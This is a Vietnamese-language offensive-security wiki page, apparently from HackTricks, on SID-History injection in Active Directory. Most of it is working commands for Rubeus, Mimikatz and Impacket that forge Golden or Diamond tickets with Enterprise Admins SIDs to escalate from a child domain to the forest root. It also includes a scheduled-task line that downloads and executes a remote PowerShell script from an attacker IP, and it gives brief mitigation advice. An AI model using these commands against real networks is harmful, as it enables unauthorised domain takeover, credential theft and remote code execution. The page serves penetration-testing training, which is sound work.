# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Mục tiêu của **SID History Injection Attack** là hỗ trợ **di chuyển người dùng giữa các domain** đồng thời đảm bảo họ tiếp tục truy cập được các tài nguyên từ domain cũ. Việc này được thực hiện bằng cách **thêm Security Identifier (SID) trước đây của người dùng vào SID History** của tài khoản mới. Đáng chú ý, quy trình này có thể bị lợi dụng để cấp quyền truy cập trái phép bằng cách thêm SID của một nhóm có đặc quyền cao (chẳng hạn như Enterprise Admins hoặc Domain Admins) từ domain cha vào SID History. Cách khai thác này cấp quyền truy cập vào tất cả tài nguyên trong domain cha.<sup>[[1]](#references)[[2]](#references)</sup>

Có hai phương pháp thực hiện cuộc tấn công này: tạo **Golden Ticket** hoặc **Diamond Ticket**.

Để xác định SID của nhóm **"Enterprise Admins"**, trước tiên cần tìm SID của domain gốc. Sau khi xác định được SID này, có thể tạo SID của nhóm Enterprise Admins bằng cách thêm `-519` vào cuối SID của domain gốc. Ví dụ, nếu SID của domain gốc là `S-1-5-21-280534878-1496970234-700767426`, thì SID của nhóm "Enterprise Admins" sẽ là `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Bạn cũng có thể sử dụng nhóm **Domain Admins**, có SID kết thúc bằng **512**.

Một cách khác để tìm SID của một nhóm thuộc domain khác (ví dụ: "Domain Admins") là dùng:

```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```


> [!WARNING]
> Lưu ý rằng có thể vô hiệu hóa SID history trong quan hệ trust, khiến cuộc tấn công này thất bại.

Theo [**tài liệu**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Vô hiệu hóa SIDHistory trên forest trust** bằng công cụ netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Áp dụng SID Filter Quarantining cho external trust** bằng công cụ netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Áp dụng SID Filtering cho domain trust trong cùng một forest** không được khuyến nghị vì đây là cấu hình không được hỗ trợ và có thể gây ra các thay đổi làm gián đoạn hoạt động. Nếu một domain trong forest không đáng tin cậy thì domain đó không nên là thành viên của forest. Trong trường hợp này, cần tách các domain đáng tin cậy và không đáng tin cậy thành các forest riêng biệt trước, nơi có thể áp dụng SID Filtering cho trust giữa các forest.

Xem bài viết này để biết thêm thông tin về cách bypass: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Lần gần nhất tôi thử cách này, tôi cần thêm đối số **`/ldap`**.

```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```

### Golden Ticket (Mimikatz) with KRBTGT-AES256

```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```

Để biết thêm thông tin về golden tickets, hãy xem:


{{#ref}}
golden-ticket.md
{{#endref}}


Để biết thêm thông tin về diamond tickets, hãy xem:


{{#ref}}
diamond-ticket.md
{{#endref}}

```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```

Leo thang lên DA của root hoặc Enterprise Admin bằng hash KRBTGT của domain bị xâm nhập:

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```

Với các quyền có được từ cuộc tấn công, bạn có thể thực hiện, chẳng hạn, một cuộc tấn công DCSync trong domain mới:


{{#ref}}
dcsync.md
{{#endref}}

### Từ Linux

#### Thủ công bằng [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)

```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```

#### Tự động bằng [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Đây là một script Impacket sẽ **tự động leo thang từ child domain lên parent domain**. Script cần:

- Domain controller mục tiêu
- Thông tin đăng nhập của một người dùng admin trong child domain

Quy trình:

- Lấy SID của nhóm Enterprise Admins trong parent domain
- Lấy hash của tài khoản KRBTGT trong child domain
- Tạo Golden Ticket
- Đăng nhập vào parent domain
- Lấy thông tin đăng nhập của tài khoản Administrator trong parent domain
- Nếu chỉ định switch `target-exec`, script sẽ xác thực với Domain Controller của parent domain thông qua Psexec.

```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```

## References

- [1] [Persistence lén lút trong Active Directory #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Security Identifier (SID) là gì? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Các cân nhắc về bảo mật cho Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - SID Filter làm ranh giới bảo mật giữa các domain Phần 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
{{#include ../../banners/hacktricks-training.md}}

